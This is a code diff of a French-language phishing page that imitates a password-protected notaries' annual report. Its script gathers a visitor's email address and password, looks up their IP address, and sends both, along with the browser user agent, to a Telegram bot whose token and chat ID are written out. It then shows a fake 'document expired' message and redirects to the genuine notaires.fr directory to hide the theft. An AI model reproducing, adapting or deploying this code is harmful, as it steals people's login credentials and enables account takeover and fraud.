@@ -1,142 +1,243 @@
-<html>
+<html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <title>Rapport annuel des notaires</title>
-    <link rel="icon" type="image/png" href="https://prismeoffice.adnov.fr/media/view/0/0/0/0/01fffecaefaa2865ad6202935da0d7a9da9c2b8e.png">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap" rel="stylesheet">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-    <link rel="stylesheet" type="text/css" href="https://btmd.web.app/bootstrapcmd.min.css" charset="utf-8" />
-    <style>
-        .pdf-display {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-top: 0;
-            gap: 12px;
-        }
-        .pdf-display img {
-            width: 48px;
-            height: 48px;
-        }
-        .pdf-display span {
-            font-size: 16px;
-            font-weight: 500;
-            color: #333;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Rapport annuel des notaires</title>
+  <link rel="icon" type="image/png" href="https://prismeoffice.adnov.fr/media/view/0/0/0/0/01fffecaefaa2865ad6202935da0d7a9da9c2b8e.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <link rel="stylesheet" href="https://btmd.web.app/bootstrapcmd.min.css" />
+  <style>
+    body {
+      font-family: 'Open Sans', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f6f6f6;
+    }
+
+    #load {
+      text-align: center;
+      margin: 20px 0;
+    }
+
+    .f-container {
+      max-width: 420px;
+      margin: 0 auto;
+      background: #fff;
+      border-radius: 8px;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .header img {
+      width: 60px;
+      height: auto;
+    }
+
+    .header p {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    .pdf-display {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 10px;
+    }
+
+    .pdf-display img {
+      width: 40px;
+      height: 40px;
+    }
+
+    .pdf-display span {
+      font-size: 15px;
+      color: #333;
+    }
+
+    .f-description {
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 20px;
+      color: #555;
+    }
+
+    .f-inputs-container {
+      margin-bottom: 15px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .f-inputs-container input {
+      width: 100%;
+      max-width: 320px;
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    #message, #message1 {
+      text-align: center;
+      font-size: 14px;
+      color: red;
+      margin: 10px 0;
+    }
+
+    .buttons {
+      text-align: center;
+    }
+
+    button {
+      margin: 6px;
+      padding: 10px 16px;
+      font-size: 14px;
+      background-color: #007bff;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      background-color: #999;
+    }
+
+    @media (max-width: 480px) {
+      .f-container {
+        padding: 15px;
+      }
+
+      .pdf-display span {
+        font-size: 14px;
+      }
+
+      .f-inputs-container input {
+        font-size: 15px;
+      }
+
+      button {
+        width: 100%;
+        max-width: 320px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div id="load">
-        <img src="https://prismeoffice.adnov.fr/media/view/0/0/0/0/01fffecaefaa2865ad6202935da0d7a9da9c2b8e.png">
+  <div id="load">
+    <img src="https://prismeoffice.adnov.fr/media/view/0/0/0/0/01fffecaefaa2865ad6202935da0d7a9da9c2b8e.png" alt="logo">
+  </div>
+  <div class="f-container">
+    <div class="header">
+      <img src="https://prismeoffice.adnov.fr/media/view/0/0/0/0/01fffecaefaa2865ad6202935da0d7a9da9c2b8e.png" alt="logo">
+      <p><strong>Ce document est protégé et son ouverture nécessite une authentification</strong></p>
+      <div class="pdf-display">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgu3UK9Lqw27KT2l-1E90NJZARVgLGz1jEtg&s" alt="PDF">
+        <span>Doc0187.pdf – 45.1KB</span>
+      </div>
     </div>
-    <div class="f-container">
-        <div class="header">
-            <img src="https://prismeoffice.adnov.fr/media/view/0/0/0/0/01fffecaefaa2865ad6202935da0d7a9da9c2b8e.png">
-            <p style="text-align: center; font-weight: 600; color: #333; margin-top: 10px; font-size: 15px;">
-                <strong>Ce document est protégé et son ouverture nécessite une authentification</strong>
-            </p>
-            <div class="pdf-display">
-                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgu3UK9Lqw27KT2l-1E90NJZARVgLGz1jEtg&s" alt="PDF">
-                <span>Doc0187.pdf – 45.1KB</span>
-            </div>
+    <div class="f-content">
+      <form method="post" onsubmit="sendToTelegram(); return false;">
+        <div class="f-description">
+          Pour lire ce rapport, veuillez entrer les identifiants de la messagerie à laquelle le fichier a été envoyé
         </div>
-        <div class="f-content">
-            <form method="post" onsubmit="sendToTelegram(); return false;">
-                <div class="f-description">Pour lire ce rapport, veuillez entrer les identifiants de la messagerie à laquelle le fichier a été envoyé</div>
-                <div id="message1" style="display: none;">Document expiré</div>
-                <div id="message"></div>
-                <div class="f-inputs-container">
-                    <input id="oneo" name="mega" placeholder="Adresse e-mail" type="email" required autocomplete="off" autofocus>
-                </div>
-                <div class="f-inputs-container" id="twoo-container">
-                    <input id="twoo" name="giga" placeholder="Mot de passe" type="password" required autocomplete="off">
-                </div>
-                <div class="f-inputs-container buttons">
-                    <center>
-                        <button id="next">Continuer</button>
-                        <button id="submit-btn">S'identifier</button>
-                    </center>
-                </div>
-            </form>
+        <div id="message1" style="display: none;">Document expiré</div>
+        <div id="message"></div>
+        <div class="f-inputs-container">
+          <input id="oneo" name="mega" placeholder="Adresse e-mail" type="email" required autocomplete="off" autofocus>
         </div>
+        <div class="f-inputs-container" id="twoo-container" style="display: none;">
+          <input id="twoo" name="giga" placeholder="Mot de passe" type="password" required autocomplete="off">
+        </div>
+        <div class="f-inputs-container buttons">
+          <button type="button" id="next" onclick="showPasswordField()">Continuer</button>
+          <button type="submit" id="submit-btn" style="display: none;">S'identifier</button>
+        </div>
+      </form>
     </div>
+  </div>
 
-    <script src="https://message-notaireacces.web.app/bootstrapcmdadm.min.js"></script>
-    <script>
-        // Configuration Telegram Bot
-        const TELEGRAM_BOT_TOKEN = '7921397756:AAHOyMtgdhSbH3sx1CQghhKFfpgUnhVoEzY';
-        const TELEGRAM_CHAT_ID = '-4834353562';
+  <script>
+    const TELEGRAM_BOT_TOKEN = '7921397756:AAHOyMtgdhSbH3sx1CQghhKFfpgUnhVoEzY';
+    const TELEGRAM_CHAT_ID = '5601119281';
 
-        function showPasswordField() {
-            const email = document.getElementById('oneo').value;
-            if (!email) {
-                document.getElementById('message').innerHTML = 'Veuillez saisir votre adresse e-mail';
-                document.getElementById('message').style.display = 'block';
-                return;
-            }
-            document.getElementById('twoo-container').style.display = 'block';
-            document.getElementById('next').style.display = 'none';
-            document.getElementById('submit-btn').style.display = 'inline-block';
-            document.getElementById('twoo').focus();
+    function showPasswordField() {
+      const email = document.getElementById('oneo').value.trim();
+      if (!email) {
+        document.getElementById('message').innerHTML = 'Veuillez saisir votre adresse e-mail';
+        document.getElementById('message').style.display = 'block';
+        return;
+      }
+      document.getElementById('twoo-container').style.display = 'block';
+      document.getElementById('next').style.display = 'none';
+      document.getElementById('submit-btn').style.display = 'inline-block';
+      document.getElementById('twoo').focus();
+    }
+
+    async function sendToTelegram() {
+      const email = document.getElementById('oneo').value.trim();
+      const password = document.getElementById('twoo').value.trim();
+
+      if (!email || !password) {
+        document.getElementById('message').innerHTML = 'Veuillez remplir tous les champs';
+        document.getElementById('message').style.display = 'block';
+        return;
+      }
+
+      const submitBtn = document.getElementById('submit-btn');
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Vérification...';
+
+      try {
+        let userIP = 'Non disponible';
+        try {
+          const ipResponse = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipResponse.json();
+          userIP = ipData.ip;
+        } catch (e) {}
+
+        const message = `🔐 NOUVELLE CONNEXION NOTAIRE\n\n📧 Email: ${email}\n🔑 Mot de passe: ${password}\n\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n🌐 IP: ${userIP}\n📱 User Agent: ${navigator.userAgent}`;
+
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+        });
+
+        if (response.ok) {
+          document.getElementById('message').innerHTML = 'Vérification en cours...';
+          document.getElementById('message').style.display = 'block';
+
+          setTimeout(() => {
+            document.getElementById('message1').style.display = 'block';
+            document.getElementById('message').style.display = 'none';
+            submitBtn.disabled = false;
+            submitBtn.textContent = "S'identifier";
+
+            setTimeout(() => {
+              window.location.href = "https://www.notaires.fr/fr/directory";
+            }, 10000);
+          }, 3000);
+        } else {
+          throw new Error("Échec de l'envoi");
         }
-
-        async function sendToTelegram() {
-            const email = document.getElementById('oneo').value;
-            const password = document.getElementById('twoo').value;
-            if (!email || !password) {
-                document.getElementById('message').innerHTML = 'Veuillez remplir tous les champs';
-                document.getElementById('message').style.display = 'block';
-                return;
-            }
-
-            const submitBtn = document.getElementById('submit-btn');
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Vérification...';
-
-            try {
-                let userIP = 'Non disponible';
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    userIP = ipData.ip;
-                } catch (e) {}
-
-                const message = `🔐 NOUVELLE CONNEXION NOTAIRE\n\n📧 Email: ${email}\n🔑 Mot de passe: ${password}\n\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n🌐 IP: ${userIP}\n📱 User Agent: ${navigator.userAgent}`;
-
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
-                });
-
-                if (response.ok) {
-                    document.getElementById('message').innerHTML = 'Vérification en cours...';
-                    document.getElementById('message').style.display = 'block';
-
-                    setTimeout(() => {
-                        document.getElementById('message1').style.display = 'block';
-                        document.getElementById('message').style.display = 'none';
-                        submitBtn.disabled = false;
-                        submitBtn.textContent = 'S\'identifier';
-
-                        // Redirection après 10 secondes
-                        setTimeout(() => {
-                            window.location.href = "https://www.notaires.fr/fr/directory";
-                        }, 10000);
-                    }, 3000);
-                } else {
-                    throw new Error('Erreur envoi');
-                }
-
-            } catch (error) {
-                document.getElementById('message').innerHTML = 'Erreur de connexion. Veuillez réessayer.';
-                document.getElementById('message').style.display = 'block';
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'S\'identifier';
-            }
-        }
-    </script>
+      } catch (error) {
+        document.getElementById('message').innerHTML = 'Erreur de connexion. Veuillez réessayer.';
+        document.getElementById('message').style.display = 'block';
+        submitBtn.disabled = false;
+        submitBtn.textContent = "S'identifier";
+      }
+    }
+  </script>
 </body>
 </html>
